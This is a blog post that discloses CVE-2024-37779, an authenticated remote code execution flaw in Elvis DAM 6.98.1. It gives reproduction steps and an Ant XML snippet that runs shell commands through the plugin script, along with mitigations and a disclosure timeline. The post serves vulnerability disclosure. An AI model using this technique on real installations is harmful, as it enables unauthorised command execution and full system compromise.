[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fc544d879ef1e&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40daviddepaulasantos%2Four-brand-new-cve-authenticated-remote-code-execution-rce-on-elvis-dam-c544d879ef1e&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40daviddepaulasantos%2Four-brand-new-cve-authenticated-remote-code-execution-rce-on-elvis-dam-c544d879ef1e&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Our Brand New CVE — Authenticated Remote Code Execution (RCE) on Elvis Dam

[![David de Paula Santos](https://miro.medium.com/v2/resize:fill:88:88/1*uQMx4wofFnfvjDRLLxxBNQ.jpeg)](/%40daviddepaulasantos?source=post_page---byline--c544d879ef1e--------------------------------)

[David de Paula Santos](/%40daviddepaulasantos?source=post_page---byline--c544d879ef1e--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F50e5700b1c2b&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40daviddepaulasantos%2Four-brand-new-cve-authenticated-remote-code-execution-rce-on-elvis-dam-c544d879ef1e&user=David+de+Paula+Santos&userId=50e5700b1c2b&source=post_page-50e5700b1c2b--byline--c544d879ef1e---------------------post_header-----------)

3 min read·Sep 21, 2024

--

Listen

Share

We have identified during a pentesting an **Authenticated Remote Code Execution (RCE)** vulnerability in **Elvis DAM version 6.98.1, build 429** that exploits the Apache Ant script functionality within the platform’s control panel. This flaw allows authenticated users to execute arbitrary commands, which could potentially result in a full system compromise. This vulnerability got us the **CVE-2024–37779**.

![]()
# Vulnerability Details

The vulnerability resides in the **plugins/active/…/ant.script.xml** file, where an attacker can alter the file with a malicious payload. By abusing Apache Ant’s command execution functionality, an authenticated user can establish a connection to a Command and Control (C2) server controlled by the attacker’s auditing team.

Steps to reproduce the issue:

**1.**Authenticate to the Elvis DAM Management Console.

2.Navigate to **Server configuration > Files**, and search for “ant”. Open the **ant.script.xml** file.

![]()

3.Modify the code to execute any command of your choosing. For example, the following command returns the user running the process:

```
<?xml version=”1.0"?>
<project>
 <target name=”run”>
 <exec executable=”/bin/sh” outputproperty=”baroverride.out”>
 <arg value=”-c”/>
 <arg value=”id”/>
 </exec>
 <echo>baroverride.out: ${baroverride.out}</echo>
 </target>
</project>
```

4.Save the changes and proceed to the **Plugins > Scheduled Plugins** section. Select the plugin and click **Execute Plugin** to run it.

![]()

5.After execution, the results can be retrieved by downloading plugin logs from **Support tools**. The logs are packaged in a `.zip` file, with individual plugin execution logs saved in `.txt` files.

![]()

6.BOOM! We have the RCE:

![]()
# Recommendations

We strongly advise the following actions to mitigate this vulnerability:

1. **Apply Input Validation**: Ensure that only trusted and expected input is allowed within the Apache Ant scripting functionality. All user input must be sanitized to prevent the execution of arbitrary commands.
2. **Restrict Plugin Execution**: Limit the ability to execute plugins only to authorized administrators, and ensure that these operations are logged and monitored.
3. **Patch the Issue**: The Elvis DAM team should release a patch that removes or restricts the unsafe command execution functionality within the affected Ant script.
4. **Monitor Logs**: Regularly audit and monitor plugin logs to detect any abnormal activity or unauthorized executions.
5. **Update Access Control**: Implement tighter role-based access controls (RBAC) within the management console to limit the exposure to trusted users only.

# Timeline of Disclosure

* **21/04/2024:** Initial discovery of the vulnerability.
* **12/06/2024:** First contact with the Elvis DAM team via email at team@swivle.com.
* **17/06/2024**: Second attempt to contact the Elvis DAM team.
* **25/06/2024**: Third attempt to reach out to the Elvis DAM team.
* **18/07/2024**: Fourth attempt to communicate the issue to the Swivle team.
* **10/09/2024:** Fifth and final attempt to communicate the issue to the Swivle team and letting them know we’re going to publish the CVE. Also, no bounty received by them as mentioned at their website.
* **21/09/2024:** No contact from them. Vulnerability Published.

Despite multiple attempts to notify the vendor, we have not received any response. In adherence to the [OWASP Responsible Disclosure Guidelines](https://owasp.org), and given that the Elvis DAM team did not acknowledge or addressed the vulnerability, we are publishing the details publicly.

# Researchers

* David Silva (<https://www.linkedin.com/in/msc-david-s-6b79b241/>)
* CyberX — The Ethical Hacking Services (<https://www.linkedin.com/company/cyberx-portugal/>)
* Fujitsu Portugal

**Stay vigilant and ensure your systems are protected! Always count on REAL ethical hackers for your audit :D**

[Cybersecurity](/tag/cybersecurity?source=post_page-----c544d879ef1e--------------------------------)[Vulnerability](/tag/vulnerability?source=post_page-----c544d879ef1e--------------------------------)[Ethical Hacking](/tag/ethical-hacking?source=post_page-----c544d879ef1e--------------------------------)[Hacking](/tag/hacking?source=post_page-----c544d879ef1e--------------------------------)[Cyber Security Awareness](/tag/cyber-security-awareness?source=post_page-----c544d879ef1e--------------------------------)

--

--

[![David de Paula Santos](https://miro.medium.com/v2/resize:fill:96:96/1*uQMx4wofFnfvjDRLLxxBNQ.jpeg)](/%40daviddepaulasantos?source=post_page---post_author_info--c544d879ef1e--------------------------------)[![David de Paula Santos](https://miro.medium.com/v2/resize:fill:128:128/1*uQMx4wofFnfvjDRLLxxBNQ.jpeg)](/%40daviddepaulasantos?source=post_page---post_author_info--c544d879ef1e--------------------------------)Follow[## Written by David de Paula Santos](/%40daviddepaulasantos?source=post_page---post_author_info--c544d879ef1e--------------------------------)[28 Followers](/%40daviddepaulasantos/followers?source=post_page---post_author_info--c544d879ef1e--------------------------------)·[29 Following](/%40daviddepaulasantos/following?source=post_page---post_author_info--c544d879ef1e--------------------------------)

Founder CyberX Portugal | Cyber Security Specialist | HTB CPTS | HTB CBBH | OSCP | CYSA+ | Pentest+

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----c544d879ef1e--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----c544d879ef1e--------------------------------)[About](/about?autoplay=1&source=post_page-----c544d879ef1e--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----c544d879ef1e--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----c544d879ef1e--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----c544d879ef1e--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----c544d879ef1e--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----c544d879ef1e--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----c544d879ef1e--------------------------------)[Teams](/business?source=post_page-----c544d879ef1e--------------------------------)

